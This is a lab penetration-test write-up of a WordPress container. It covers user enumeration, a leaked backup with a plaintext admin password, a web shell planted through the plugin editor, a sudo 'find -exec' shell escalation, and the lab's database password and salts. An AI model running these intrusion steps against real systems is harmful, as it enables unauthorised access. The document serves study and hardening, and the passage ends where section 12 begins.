# Whoiam — Lab 108 (Fácil)

**Target:** `172.17.0.6` — Ubuntu 24.04.3, Apache 2.4.58, WordPress **6.5.4 as shipped**
(self-updated to **7.1.2** mid-engagement — see §7), PHP 8.3, MariaDB on 127.0.0.1:3306.
**Active plugin:** Modern Events Calendar Lite **5.16.2**.
**Result:** `uid=33(www-data)` → `uid=1001(rafa)`. **Root NOT reached** — the shipped
sudoers ladder is broken by containerisation (§5). **No reward present** (§6).

**Topology.** `auto_deploy.sh` was read, never run. It creates one network
(`dockernetwork`, `--internal`, line 140) and **one** container (line 142). No second
host, no macvlan, no pivot. The engagement is single-host and stayed single-host.

---

## 0. The headline question: does the WordPress class generalise past lab 90?

**Direct answer: no — not as one class. What generalises is a measurement floor, and this
lab proves it by failing to share lab 90's entry or its escalation.**

Lab 90's writeup is built on a *plugin CVE*. This lab shares **none** of that machinery,
and I checked each piece rather than assuming:

| Lab 90 (Norc) relied on | Lab 108 (Whoiam) |
|---|---|
| WP Fastest Cache 1.2.1, CVE-2023-6063 unauth SQLi | **no SQLi anywhere** — the only upload handler rejects, see §4 |
| `hide-my-wp` renamed `/wp-login.php` → `/ghost-login` | **canonical paths**: `/wp-login.php` → 200, `/wp-admin/` → 302 |
| `password-protected` gating one vhost, **second vhost** disclosing the plaintext password | **one vhost only** (`000-default.conf`, single `DocumentRoot`) |
| cron `eval` of a www-data-writable file → `kvzlx` | **no cron, no file capability** (`getcap -r /` empty) |
| `wordpress_logged_in` **cookie as the SQLi carrier** | **nothing consumes that cookie** — `grep -rn wordpress_logged_in wp-content/plugins/` returns **zero hits** |

That last row is the sharpest one. In lab 90 the `wordpress_logged_in` cookie was the
injection vector because a plugin read it. In lab 108 no plugin reads it at all. So the
lab-90 rule "read the plugin PHP, find the cookie sink" yields **nothing** here, and a
tester porting lab 90's checklist would burn the whole budget on a sink that is absent.

**What 108 had that 90 could not have had.** Two things, both about *platform facts* rather
than about any CVE:

1. **The auth material is not where `wp-config.php` says it is.** `wp-config.php:54-61`
   ships all eight keys and salts as the literal `'put your unique phrase here'`. Reading
   the file and concluding "default salts ⇒ forgeable cookies" is **wrong**, and I proved
   it: WordPress explicitly detects that placeholder (`pluggable.php:2614`), discards the
   constant, and falls back to random 64-char values in `wp_options` (`pluggable.php:2638`).
   My offline nonce forgery built from the placeholder was **rejected**. The trap is
   specific to a real installer-written install — precisely the state lab 108 ships in.
2. **The cookie name is not derived from the configured site either.** `wp-config.php:40-41`
   define `WP_HOME`/`WP_SITEURL` from `$_SERVER['SERVER_ADDR']`, so the stored `siteurl`
   option (`http://172.17.0.2`) is inert and `COOKIEHASH` tracks the container's interface
   IP. See §3.

**Recommendation to the parent.** WordPress should get a **section, not a row**, and the
section should be built as *facts to measure on every install*, because those facts are
identical every time and every one of them is answerable by reading artefacts in minutes —
while the exploitable sink is per-lab:

1. user/author enumeration, and the disagreement between surfaces;
2. the role model, read from `wp_usermeta` (`wp_capabilities`, `wp_user_level`) and asserted
   with `user_can()`, never inferred from the username;
3. where authentication state actually lives — the cookie name, what it signs, and which
   of the two cookies is load-bearing (§3);
4. the `wp_salt()` fallback rule (**never read salts from `wp-config.php` alone**);
5. which plugins are *active* (`wp_options.active_plugins`) and which are merely present;
6. read the plugin/theme PHP for the sink before sending a single payload.

Items 1–5 are a checklist; item 6 is the per-lab part that made lab 90 hard. Both this
writeup and lab 90's are then *instances* of that section rather than two unrelated entries.

---

## 1. Surface

```
$ nmap -sV -Pn -p- 172.17.0.6
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
Not shown: 65534 closed tcp ports (conn-refused)
```

**What a TCP scan cannot see — measured, not assumed:**

```
$ cat /proc/net/udp        -> (empty)
$ cat /proc/net/udp6       -> (empty)
$ docker inspect whoiam:latest -f '{{json .Config.ExposedPorts}}'  -> null
```

No UDP surface at all. This is the one place the standard "check `/proc/net/udp`" warning
is *load-bearing* and the answer is clean. `ss -lntup` agrees: `127.0.0.1:3306` (MariaDB,
loopback-only, unreachable remotely) and `0.0.0.0:80` (apache2, pid 24).

| Layer | Finding |
|---|---|
| OS | Ubuntu 24.04 LTS (Noble), Linux |
| Web | Apache 2.4.58, single vhost `000-default.conf`, `DocumentRoot /var/www/html` |
| App | WordPress **6.5.4 shipped** → self-updated to **7.1.2** (§7) |
| DB | MariaDB on `127.0.0.1:3306`; root uses `unix_socket` auth |
| Plugins present | `akismet`, `hello.php` (Hello Dolly 1.7.2), `modern-events-calendar-lite` **5.16.2** |
| Plugin **active** | `modern-events-calendar-lite` only (`wp_options.active_plugins`) |
| Themes | `twentytwentyfour` (active), `twentytwentythree`, `twentytwentytwo` |
| Users | `erik` (ID 1), `developer` (ID 2) — **both administrators** |
| Local users | `rafa` (uid 1001), `ruben` (uid 1002) |
| Privileges | `/etc/sudoers:49,51,53` — see §5 |

Versions are from the artefacts, cross-checked between two of them:
`modern-events-calendar-lite.php:7` (`* Version: 5.16.2`) and `:34`
(`define('MEC_VERSION','5.16.2')`), independently corroborated by the served
`readme.txt` (`Stable tag: 5.16.2`).

### Surfaces TCP does not show, and the two that mattered

| Surface | Result |
|---|---|
| `/wp-json/` | **404** — permalinks are off, so the pretty REST root does not exist |
| `/index.php?rest_route=/wp/v2/users` | **200** — the REST API is fully live via `?rest_route=` |
| `xmlrpc.php` | POST reachable (GET → 405); `system.listMethods` answered |
| `/backups/databaseback2may.zip` | **200, 241 bytes** — the entry point, see F1 |
| `/wp-content/plugins/modern-events-calendar-lite/` | 200 (`index.php` stub; no autoindex listing) |
| `/wp-content/uploads/` | 200, empty |
| Virtual hosts | none — one `DocumentRoot`, `ServerName` unset, catch-all |

---

## 2. The class

**Entry criterion:** *does the platform disclose an account whose credential is recoverable
without exploiting anything?*

**Source that settled it:** `/var/www/html/backups/databaseback2may.zip`, found by listing
the document root rather than by guessing a path. Found after the credential route had been
exhausted by other means (§8).

```
$ curl -o backup.zip -w "%{http_code} %{size_download} %{content_type}\n" \
    http://172.17.0.6/backups/databaseback2may.zip
200 241 application/zip

$ unzip -p backup.zip 29DBMay
| Username  |         Password        |
|-----------|-------------------------|
| developer | 2wmy3KrGDRD%RsA7Ty5n71L^|
|-----------|-------------------------|
```

---

## 3. Where authentication state actually lives

This is the section lab 90's writeup could not have produced, so it is measured in full.

### 3.1 The cookie name

```
wp-includes/default-constants.php:252   define( 'COOKIEHASH', md5( $siteurl ) );
wp-includes/default-constants.php:290   define( 'LOGGED_IN_COOKIE', 'wordpress_logged_in_' . COOKIEHASH );
```

`$siteurl = get_site_option('siteurl')`. But the stored option is `http://172.17.0.2`, and
`md5('http://172.17.0.2')` is **not** the hash in use. The chain that explains it:

```
wp-config.php:40   define('WP_HOME',   'http://' . $_SERVER['SERVER_ADDR']);
wp-config.php:41   define('WP_SITEURL','http://' . $_SERVER['SERVER_ADDR']);
wp-includes/default-filters.php:304    add_filter( 'option_siteurl', '_config_wp_siteurl' );
wp-includes/functions.php:4797-4801    _config_wp_siteurl(): return WP_SITEURL if defined
```

So the DB option is **inert** and the effective site URL is the server's own interface
address. Verified by computing candidates rather than trusting one:

```
a2a379b8590d3431d7153bb3b68da0df  http://172.17.0.2      <- the stored option (NOT used)
cf3a188f6e5f5e154f4ea055d8760929  http://172.17.0.6      <- matches the issued cookie
```

Cookie names actually observed in `Set-Cookie`:

```
wordpress_cf3a188f6e5f5e154f4ea055d8760929              path=/wp-admin   (auth, scheme 'auth')
wordpress_logged_in_cf3a188f6e5f5e154f4ea055d8760929   path=/           (scheme 'logged_in')
```

Consequence: **the authentication cookie name is bound to the host's interface IP**, not to
the configured site. Redeploy the same image on a different address and every session cookie
is orphaned. And in a CLI/OPcache context `$_SERVER['SERVER_ADDR']` is undefined — WordPress
logs `Undefined array key "SERVER_ADDR"` and derives a *different*, degenerate site URL
(observed repeatedly in `/var/log/apache2/error.log` and on every `wp-load.php` CLI call).

### 3.2 What the cookie signs

```
wp-includes/pluggable.php:970-972
    $key  = wp_hash( $user->user_login . '|' . $pass_frag . '|' . $expiration . '|' . $token, $scheme );
    $hash = hash_hmac( 'sha256', $user->user_login . '|' . $expiration . '|' . $token, $key );
wp-includes/pluggable.php:974
    $cookie = $user->user_login . '|' . $expiration . '|' . $token . '|' . $hash;
```

Four fields: `user_login | expiration | session token | HMAC-SHA256`. Validation:

```
wp-includes/pluggable.php:867   if ( ! hash_equals( $hash, $hmac ) )      -> reject
wp-includes/pluggable.php:889   if ( ! $manager->verify( $token ) )      -> reject
```

`$manager->verify($token)` is `WP_Session_Tokens` against
`wp_usermeta.session_tokens`. **This is the load-bearing check and the reason the cookie is
not forgeable offline**: an attacker must hold a token that is actually in the target user's
session store. No token ⇒ no login, no matter how well the HMAC is computed.

### 3.3 The salt trap — read `wp_salt()`, not `wp-config.php`

`wp-config.php:54-61` ships all eight values as the placeholder:

```php
define( 'AUTH_KEY',  'put your unique phrase here' );
...
define( 'NONCE_SALT','put your unique phrase here' );   // :61
```

The obvious conclusion — default salts, forgeable cookies — is **false**, because core
guards against exactly that mistake:

```
wp-includes/pluggable.php:2614   $duplicated_keys['put your unique phrase here'] = true;
wp-includes/pluggable.php:2621   $duplicated_keys[ __( 'put your unique phrase here' ) ] = true;
wp-includes/pluggable.php:2638   $options_to_prime[] = "{$key}_{$second}";   // ignore the constant
wp-includes/pluggable.php:2676   $values[$type] = get_site_option( "{$scheme}_{$type}" );
```

The effective key material lives in **`wp_options`**:

```
auth_key         0|7zjSoSy;JZnP6_G8ji+fEK&Dz7U3Sx#;x;*{}4Dp/k@]SsGS9A0`$GO>n-bVF]
logged_in_key    (0?1veiN5:EdecGUi;2?_^pAb=&uHcVNX#-ZTvX$C{1[xzUu*R%(2:Z8iPNo-t_X
nonce_key        4Gj6TYoJ9W4<gvGrN+V,i<Adk2~]3HM,/t P#<MiqvW440&D)PG_})GD$JM{bA>O
```

**Proof that this held, rather than an assertion:** I computed a nonce *offline* in Python
from the placeholder key material — `hmac_md5(tick|action|0|"", NONCE_KEY+NONCE_SALT)[-12:-2]`
— and posted it to `wp-admin/admin-ajax.php?action=mec_fes_upload_featured_image`.

```
NEGATIVE CONTROL  _wpnonce=deadbeef99   -> {"success":0,"code":"NONCE_IS_INVALID"}
FORGED (offline)  _wpnonce=5dc7775774   -> {"success":0,"code":"NONCE_IS_INVALID"}
```

The control fires, so the detector works. The forgery fails, so the fallback works. Had I
trusted `wp-config.php` I would have reported an unauthenticated upload primitive that does
not exist.

### 3.4 What `wordpress_logged_in` actually proves

```
wp-includes/user.php:598
    return wp_validate_auth_cookie( $_COOKIE[ LOGGED_IN_COOKIE ], 'logged_in' );
```

It is a thin wrapper — the same validator, different key. So it grants nothing extra, and
it is not required. Measured, with redirects disabled so the auth decision is visible
(`urllib` follows 302→login→200 by default; see §8):

| # | Cookies sent | Result |
|---|---|---|
| A | `wordpress_<hash>` **+** `wordpress_logged_in_<hash>` | **200** authenticated |
| B | **`wordpress_logged_in_<hash>` alone** | **302 → wp-login.php** |
| C | `wordpress_<hash>` **alone** | **200** authenticated |
| D | control: `wordpress_logged_in_` with HMAC zeroed | 302 → wp-login.php |
| E | control: no cookies at all | 302 → wp-login.php |

**Answer: `wordpress_logged_in` proves only that some WordPress process previously computed
a valid HMAC over `user_login|expiration|token` with `wp_salt('logged_in')` **and** that the
token was present in the session store at the moment it was validated. It authenticates
nothing by itself (B), it is not necessary when the auth cookie is present (C), and it is
not forgeable without the DB-stored `logged_in_key`/`logged_in_salt` plus a real token.**

This is also why lab 90's writeup is right to treat that cookie as an *attack surface*
rather than a *session*: there it mattered only because a plugin parsed it into SQL.

---

## 4. Enumeration, the role model, and what the plugin actually exposed

### 4.1 Author enumeration, with a positive control

```
?author=1     301 -> http://172.17.0.6/index.php/author/erik/
?author=2     200   body: <title>developer - Whoiam</title>, author/developer
?author=3     404
?author=9999  404     <- control: the 404 is real, not a blanket response
?author=zzz   200     (ignored, falls through to the front page)
```

Both accounts are public: `erik` and `developer`.

### 4.2 The two surfaces disagree — which is the useful part

REST enumeration (`/index.php?rest_route=/wp/v2/users`) returns **only `erik`**, because the
endpoint lists users with published posts and `developer` has none. `?author=2` exposes
`developer` anyway. So:

- REST alone → incomplete (misses `developer`).
- `?author=N` sweep alone → complete, but the status code lies: ID 2 answers **200**, not
  301, and the login is only visible in the body title.

Neither is sufficient alone. That disagreement is the actual finding, not the usernames.

### 4.3 The login form is a user-existence oracle

```
existing user   -> "Error: The password you entered for the username erik is incorrect."
nonexistent     -> "Error: The username nosuchuser_zzz is not registered on this site."
```

Two byte-different error strings, unauthenticated.

### 4.4 Role model — asserted, not inferred

```
ID 1 erik       wp_capabilities = a:1:{s:13:"administrator";b:1;}   wp_user_level = 10
ID 2 developer  wp_capabilities = a:1:{s:13:"administrator";b:1;}   wp_user_level = 10
developer: roles=administrator ; user_can(manage_options)=true
```

**Both** accounts are full administrators. There is no low-privilege foothold to escalate
*within* WordPress — the role model is flat. This matters: it means any credential compromise
here is immediate full compromise, and it means a "register a subscriber and escalate"
strategy has no surface.

### 4.5 The plugin: what it exposes and why the known CVE does not apply

Every `wp_ajax_nopriv_*` handler MEC 5.16.2 registers:

```
mec_booking_calendar_load_month · mec_get_ajax_search_data · mec_ajax_login_data
speaker_adding · mec_fes_form · mec_fes_upload_featured_image
```

The interesting one is the unauthenticated **file upload** — `app/features/fes.php:58-59`
registers `wp_ajax_nopriv_mec_fes_upload_featured_image`, which is the shape of
CVE-2021-24145. It does not work here, for three independent reasons read from the source:

```php
// app/features/fes.php:350-353  — gate 1: nonce, keyed on the DB-random nonce_key
if(!isset($_POST['_wpnonce'])) $this->main->response(array('success'=>0,'code'=>'NONCE_MISSING'));
if(!wp_verify_nonce(sanitize_text_field($_POST['_wpnonce']), 'mec_fes_upload_featured_image'))
    $this->main->response(array('success'=>0,'code'=>'NONCE_IS_INVALID'));

// app/features/fes.php:363-369  — gate 2: extension allowlist (last dot-segment)
$allowed = array('gif','jpeg','jpg','png');
$extension = end(explode('.', $uploaded_file['name']));
if(!in_array($extension, $allowed)) $this->main->response(...'INVALID_EXTENSION');

// app/features/fes.php:377      — gate 3: core re-validates type via wp_handle_upload()
$movefile = wp_handle_upload($uploaded_file, array('test_form'=>false));
```

`mec_ajax_login_data` (`app/features/login.php:35-48`) also calls `wp_signon()` with
`remember=true` and would hand out a session — but it is behind the same nonce
(`app/features/login.php:41`).

**A hypothesis I had to refute.** `fes_upload()` calls `$this->main->response(...)` on nonce
failure **without a `return`**, which looks like a fail-open write. Reading the callee killed it:

```php
// app/libraries/main.php:1606-1610
public function response($response) { echo json_encode($response); exit; }
```

`exit`. I posted two files with a bad nonce and then checked the filesystem rather than the
status code — `wp-content/uploads/` was empty, and a `find` on it returned nothing. The
control would have caught the opposite, which is the only reason this is worth recording.

---

## 5. Chain

| # | → | Mechanism | Identity proof |
|---|---|---|---|
| 1 | unauth | TCP recon; `/proc/net/udp` empty | — |
| 2 | unauth | `?author=N` sweep → `erik`, `developer`; REST `?rest_route=` corroborates one of them | `?author=3` and `?author=9999` → 404 (control) |
| 3 | unauth | `GET /backups/databaseback2may.zip` → plaintext admin credential | 200, 241 bytes, extracted |
| 4 | unauth | Credential confirmed against the stored hash | `wp_check_password(disclosed, stolen)=bool(true)`; wrong value `bool(false)` |
| 5 | unauth | `POST /wp-login.php` as `developer` | `302` + `wordpress_<hash>` + `wordpress_logged_in_<hash>`; `/wp-admin/` → `200`, `Howdy, developer` |
| 6 | unauth | Plugin editor writes a PHP payload into `wp-content/plugins/hello.php` | mtime `2024-06-08 17:14:07` → `2026-09-30 06:09:59`, size `2578` → `118`; bad-nonce control left mtime unchanged |
| 7 | **`uid=33(www-data)`** | `GET /wp-content/plugins/hello.php?c=id` — **no activation needed** | `uid=33(www-data) gid=33(www-data) groups=33(www-data)`, `id -u` = 33 |
| 8 | **`uid=1001(rafa)`** | `sudo -n -u rafa /usr/bin/find / -maxdepth 0 -exec /bin/sh -c 'id' \;` | `uid=1001(rafa) gid=1001(rafa) groups=1001(rafa),100(users)`, `id -u` = 1001 |
| 9 | **blocked** | rafa → ruben via `sudo -n -u ruben /usr/sbin/debugfs` | see below |

### The escalation ladder, read off the artefact

```
/etc/sudoers:49   www-data ALL=(rafa)  NOPASSWD: /usr/bin/find
/etc/sudoers:51   rafa     ALL=(ruben) NOPASSWD: /usr/sbin/debugfs
/etc/sudoers:53   ruben    ALL=(ALL)   NOPASSWD: /bin/bash /opt/penguin.sh
```

Confirmed with `sudo -l -U <user>` for all three. Step 8 is exercised **over the web shell**,
not via `su`. Step 7's surprise: the payload executed **as soon as it was written** —
`hello.php` is an inactive plugin, but Apache serves `wp-content/plugins/*.php` through the
PHP handler regardless of activation state. Lab 90 had to activate its payload via REST;
that extra step is not required here.

### Rung 9 did not work — its own finding, reported separately

`debugfs` is the classic route to a root-owned filesystem through a path the caller has no
DAC rights to. It needs a block device. In this container there is none:

```
$ sudo -n -u ruben /usr/sbin/debugfs -w /dev/sda3 /dev/null
debugfs 1.47.0 (5-Feb-2023)
debugfs: No such file or directory while trying to open /dev/sda3

$ ls /dev/sda*                       -> No such file or directory
$ cat /proc/partitions               -> 8 0 325058560 sda / 8 1 1024 sda1 / 8 2 2097152 sda2
$ mknod /tmp/zz b 8 3                -> Operation not permitted      (no CAP_MKNOD)
$ ls -la /usr/sbin/debugfs           -> -rwxr-xr-x 1 root root       (not replaceable)
```

The host's `sda` is visible through `/sys` and `/proc/partitions`, but Docker did not pass
device nodes into `/dev`. Three independent blockers, each measured. `/opt/penguin.sh`
(the `ruben → root` rung) is unreachable for the same reason, and I did **not** claim it
exploitable — I never obtained `ruben`.

**This is a lab-design defect, not a tester failure.** The sudoers file describes a three-rung
ladder whose second rung cannot function inside the container the same image ships, and
whose payload (`/opt/penguin.sh`) is root-owned `0644` with no writable path to it.

---

## 6. Reward

**No reward exists in any location reachable by `www-data` or `rafa`.** Reported as a
measured absence, with the search:

- Name sweep for `flag*`, `reward*`, `*secret*` and `ctf` variants across the filesystem,
  as `rafa`: **zero hits**. Only `wp-includes/sodium_compat/src/Core/SecretStream`,
  a WordPress library directory — a name false positive, not a reward.
- Content sweep for `flag{`, `FLAG{`, `ctf{`, `CTF{` in files < 2 MB, as `www-data`:
  **two hits, both my own `/tmp/reward*.sh` scripts.** No pre-existing hit anywhere.
- `wp_options` and `wp_posts` searched for the same patterns: empty. `wp_mec_users` is empty.
  All 5 published posts are stock MEC demo events with empty bodies; the single post is
  "Hello world!".
- `/root` and `/home/ruben` are `drwx------ root` and `drwxr-x--- ruben` — both
  `Permission denied` from both identities. Not searched, and not claimed.

**This is the sixteenth lab in this series without a reward.** Four locations
(`/root`, `/home/ruben`, `/var/lib/mysql`, `/etc/shadow`) remain unsearchable because
reaching them requires `ruben` or `root`, and rung 9 is blocked.

---

## 7. The target modified itself mid-engagement

This is the most operationally important thing in the writeup, and it is not a finding about
the lab's design so much as a hazard for anyone re-running it.

My first reading of the core version was `$wp_version = '6.5.4'`. About thirteen minutes
later it read `7.1.2`. The cause:

```
$ grep -nE "AUTOMATIC_UPDATER|WP_AUTO_UPDATE|DISALLOW" /var/www/html/wp-config.php
  (none set -> core auto-update is ENABLED by default)

$ file_get_contents("https://api.wordpress.org/core/version-check/1.7/")   # from inside the container
  string(13967) "{"offers":[{"response":"upgrade","download":".../wordpress-7.1.2.zip" ...
```

The container has **outbound internet egress** and nothing disables auto-update, so
`wp-cron.php` (triggered by ordinary front-end requests) downloaded and applied a core
upgrade mid-engagement. File mtimes make it unambiguous:

```
2026-09-30 06:13:55  wp-includes/version.php      <- rewritten (core update)
2026-09-30 06:13:55  wp-admin/plugin-editor.php   <- rewritten (core update)
2024-06-08 17:14:07  wp-content/plugins/hello.php <- untouched
2024-06-08 18:01:18  wp-config.php                <- untouched
```

The image itself is clean, confirmed by reading it with the entrypoint overridden so nothing
starts and no request is ever made:

```
$ docker run --rm --entrypoint sh whoiam:latest -c 'grep -n "wp_version =" /var/www/html/wp-includes/version.php'
19:$wp_version = '6.5.4';
```

**Both numbers are correct and they mean different things: the shipped artefact is 6.5.4;
everything from minute ~13 onward ran on 7.1.2.** My chain was demonstrated on 7.1.2. It is
unaffected — every finding lives in the plugin (5.16.2), the OS/sudoers layer, or a file in
the docroot, none of which depend on the core version — but a re-run will not reproduce the
same core, and a writeup claiming a version must say *which* one it measured and how.

Also worth noting: `restore from the image` does **not** produce a stable target here. The
restored container re-upgrades on its first request. Positive restore verification is
therefore about *file* state, not version state.

---

## 8. Findings

### F1 — Database backup with a plaintext administrator credential, served from the document root
**CWE-312 / CWE-538 · Critical**

`/var/www/html/backups/databaseback2may.zip`, mode `drwxr-xr-x root root`, inside the served
`DocumentRoot`. Fetched unauthenticated:

```
200 241 bytes application/zip
$ unzip -p backup.zip 29DBMay
| Username  |         Password        |
| developer | 2wmy3KrGDRD%RsA7Ty5n71L^|
```

Confirmed as *the* credential, not merely a plausible one:

```
user=developer id=2
hash=$P$BzAMjXlNoyyZOosXmEWO26twlzEhDs.
roles=administrator
has_cap manage_options=true
wp_check_password(disclosed, stolen_hash) = bool(true)
NEGATIVE CONTROL (wrong pw)               = bool(false)
```

**Impact:** immediate full administrative takeover. No exploitation, no prior access.
Note this is the *same defect class* as lab 90's F3 (a credential disclosed by a
misconfiguration) reached by a different mechanism — a leftover backup artefact instead of a
second virtual host — which is the strongest argument for a WordPress section built on
platform facts rather than on per-lab CVEs.

**Remediation:** never store backups under a served document root. Exclude the path at the
web-server layer *and* at the deploy pipeline. Rotate the credential — anything that has
existed in a served archive must be considered disclosed. Add a CI check that fails when a
`.zip`/`.sql`/`.tar` appears beneath the web root.

### F2 — World-readable `wp-config.php` exposes the database credential to any local account
**CWE-522 / CWE-276 · High**

```
-rw-r--r-- 1 root root 3118 /var/www/html/wp-config.php
$ (as rafa)  grep DB_PASSWORD /var/www/html/wp-config.php
define( 'DB_PASSWORD', 'QnnLf5i84KNX2eT' );
```

Proven by reading it *as the escalated identity*, not by inferring it from the mode.
Independent of F1 and reachable by any non-root account, including the `ruben` account the
ladder never reaches.

**Remediation:** `chmod 640 wp-config.php`, owned by the web-server user and a deploy group;
better, move it outside the document root entirely.

### F3 — `sudoers` grants `www-data` a shell as `rafa` (two of three rungs are dead)
**CWE-269 / CWE-250 · High (rung 1) / Informational (rungs 2-3 unavailable)**

```
/etc/sudoers:49  www-data ALL=(rafa) NOPASSWD: /usr/bin/find
```

`find` accepts `-exec`, so this is an unrestricted shell as `rafa` for anyone who can write a
PHP file — i.e. it converts every web RCE into a privilege escalation. Rungs 51 and 53 are
present but not exploitable in this container (§5).

**Remediation:** drop the `find` grant, or replace it with a fixed-argument wrapper
(`/usr/local/bin/reindex` that runs a fixed command and takes no caller-controlled options).
If a chain is genuinely required, constrain *every* rung's arguments, and never ship a chain
whose middle rung depends on a resource (`/dev/*`) the deployment does not provide.

### F4 — PHP execution is not confined away from `wp-content/plugins`
**CWE-434 (consequence) · Medium**

A payload written into `wp-content/plugins/hello.php` executed immediately, without
activation, because Apache routes that directory through the PHP handler. Activation is
irrelevant to execution.

**Remediation:** `php_admin_flag engine off` on `wp-content/uploads` (and any other
non-code directory), and consider `DISALLOW_FILE_EDIT` / `DISALLOW_FILE_MODS` in
`wp-config.php` — neither is set here.

### F5 — `WP_HOME`/`WP_SITEURL` taken from `$_SERVER['SERVER_ADDR']`
**CWE-441 (unintended proxy/intermediary-style misconfiguration) · Low**

```php
wp-config.php:40-41
define('WP_HOME',    'http://' . $_SERVER['SERVER_ADDR']);
define('WP_SITEURL', 'http://' . $_SERVER['SERVER_ADDR']);
```

The stored `siteurl`/`home` options are inert; `COOKIEHASH` therefore tracks the host's
interface address (§3.1), and in any context without `SERVER_ADDR` the site URL collapses to
`http://` — producing a *different* cookie namespace, visible as a flood of
`Undefined array key "SERVER_ADDR"` in the error log on every CLI invocation of
`wp-load.php`. Not attacker-controlled via `Host:` (that is `HTTP_HOST`, a different
variable), so this is robustness and hygiene rather than a takeover path — but it makes
sessions non-portable and hides the real site URL from anyone reading the database.

**Remediation:** hardcode the two constants to the real URL; set them in the config, not from
request state.

### F6 — `wp-config.php` ships the default placeholder auth keys and salts
**CWE-1188 · Low here, high in general — and the reason is the interesting part**

`wp-config.php:54-61` are all `'put your unique phrase here'`. **This is not exploitable in
this lab**, because `pluggable.php:2614/2638` detects the placeholder and falls back to random
values in `wp_options`, and because an attacker additionally needs a live session token
(`pluggable.php:889`). My offline forgery from the placeholder was rejected (§3.3).

It is reported because it is a **trap that inverts the usual sign**: a tester who reads
`wp-config.php` concludes the opposite of the truth. Any write-up that says "default salts"
on the strength of `wp-config.php` alone is wrong.

**Remediation:** still generate real salts and put them in `wp-config.php`; do not rely on
the DB fallback, and do not let the two disagree.

### F7 — WordPress core auto-updates against live egress
**CWE-1104 (use of unmaintained third-party components) / operational hazard · Medium**

No `AUTOMATIC_UPDATER_DISABLED`, and the container reaches `api.wordpress.org`, so core
upgraded itself from 6.5.4 to 7.1.2 during the engagement (§7). The lab's own artefacts —
MEC 5.16.2, published January 2021 — are then running on a core nine major versions newer,
with no test having been performed.

**Remediation:** pin the core version in lab images; disable auto-update in the image build;
if egress is wanted, allow it only for the attacker tooling, not the target.

### F8 — Unauthenticated user enumeration via two disagreeing surfaces
**CWE-203 · Low**

`?author=N` discloses both accounts; the login form distinguishes "not registered" from
"incorrect password" by message; REST `/wp/v2/users` discloses only accounts with published
posts, so it *under*-reports relative to `?author=`. None is a vulnerability on its own; the
combination is what makes the account list reliable enough to target.

**Remediation:** this is core WordPress behaviour. `?author=` suppression is cosmetic and
removable by plugins; the practical mitigation is not publishing author archives.

---

## 9. Controls that held

Every row has a positive control, i.e. a case where the same detector was shown firing.

| # | Control | Positive control that proves the detector works | Negative evidence |
|---|---|---|---|
| C1 | Author enumeration discloses logins | `?author=1` → 301 `/author/erik/`; `?author=2` → body title `developer` | `?author=3`, `?author=9999` → 404 |
| C2 | MEC nonce rejects forged nonces | bad nonce → `{"code":"NONCE_IS_INVALID"}` | offline-computed nonce from the placeholder salt → also rejected |
| C3 | `fes_upload` refuses on nonce failure | `uploads/` contains **nothing** after two bad-nonce posts | `main.php:1609` `exit` confirmed in source |
| C4 | Credential oracle can succeed | `wp_check_password(disclosed, stolen_hash)` = `bool(true)` | wrong value = `bool(false)` |
| C5 | Login oracle discriminates | correct password → 302 + session cookies + `Howdy, developer` | wrong password → 200 + "password ... is incorrect" |
| C6 | Plugin editor rejects a bad nonce | good nonce → mtime advances, size 2578 → 118 | bad nonce → `nonce_failure`, mtime unchanged |
| C7 | REST requires auth for writes | `POST /wp/v2/posts` unauth → **401** | — |
| C8 | `wordpress_logged_in` alone is not auth | both cookies → 200 | logged_in alone → 302; tampered HMAC → 302; no cookies → 302 |
| C9 | `sudoers` is genuinely restrictive | www-data → rafa via the exact `find` binary succeeds | www-data → ruben, and rafa → `sh`, both → `sudo: a password is required` |
| C10 | Database is not reachable as the web identity | root DB access from the container works (used for ground truth) | `www-data` → `mysql -u root` → `ERROR 1698 (28000): Access denied` |
| C11 | No writable-file privesc surface | — | `find -writable` **and** `find -perm -u+w` as `rafa` both return empty, agreeing |

On C11: this image has GNU findutils, so `find -writable` is a real option here and both
spellings were run in the same shell precisely because the busybox variant of that flag
returns usage and exits 0. Two tools, same answer.

---

## 10. NOT tested (scope, not gaps in effort)

- **Offline cracking beyond the corpora.** 517,506-line corpus × 2 users = 1,035,006
  `CheckPassword` calls, exhausted, 0 hits; plus 499 generated and 1,997 lab-themed
  candidates. Not tried: a GPU cracker, a much larger corpus, or a rules-based attack.
  This is a limit of available tooling, **not** evidence the password is uncrackable — and
  it turned out to be moot, since the credential was disclosed in plaintext (F1).
- **Any behaviour specific to WordPress 6.5.4.** Everything from minute ~13 onward ran on the
  self-updated 7.1.2 (§7). Whether the plugin editor, the REST auth gate, or the nonce
  fallback behave identically on 6.5.4 was not checked.
- **Rung 9 beyond the three blockers.** I did not attempt to create a filesystem image and
  run `debugfs -w` against it, because doing so grants nothing: the image would be owned by
  the caller, and `debugfs` bypasses DAC only on filesystems it should not be able to reach.
- **Whether `/opt/penguin.sh` is injectable by `ruben`.** Its `[[ $num -eq 42 ]]` compares an
  attacker-influenced value in an arithmetic context, which is worth examining. `ruben` was
  never obtained, so this is untested and **not** claimed.

## 11. Discarded with reason

| Hypothesis | Why discarded |
|---|---|
| CVE-2021-24145-style unauth upload via `mec_fes_upload_featured_image` | Nonce keyed on the DB-random `nonce_key`; extension allowlist (`fes.php:363-369`); `wp_handle_upload` re-checks type. Forgery attempted and rejected. |
| `wordpress_logged_in` as a SQLi carrier (the lab 90 vector) | `grep -rn wordpress_logged_in wp-content/plugins/` → **zero hits**. No plugin here consumes that cookie. |
| Forgeable auth/nonce cookies from default salts in `wp-config.php` | `pluggable.php:2614` detects the placeholder and falls back to DB keys; forgery rejected; `pluggable.php:889` additionally requires a live session token. |
| `hide-my-wp`-style path renaming | `/wp-login.php` → 200, `/wp-admin/` → 302. Canonical paths; nothing is renamed. |
| Second vhost disclosing a credential (lab 90's F3 mechanism) | Only `000-default.conf` exists, one `DocumentRoot`. No second host exists. |
| `debugfs` block-device privesc | Attempted and refuted: no device node in `/dev`, `mknod` → `EPERM`, binary root-owned (§5). |
| `auth_pam_tool` SUID (CVE-2022-24407 shape) | Present, but it lives in `/usr/lib/mysql/plugin/auth_pam_tool_dir`, mode `0700 mysql:root`. Neither `www-data` nor `rafa` can traverse it. |
| PHP fatal-error rollback as the cause of the editor failure | Ruled out by reading `wp_edit_theme_plugin_file`: the loopback check is gated on `$is_active`, and `hello.php` is inactive. The real cause was my POST fields (§12). |

---

## 12. Instrumentation defects

Six, and several of them nearly became findings.

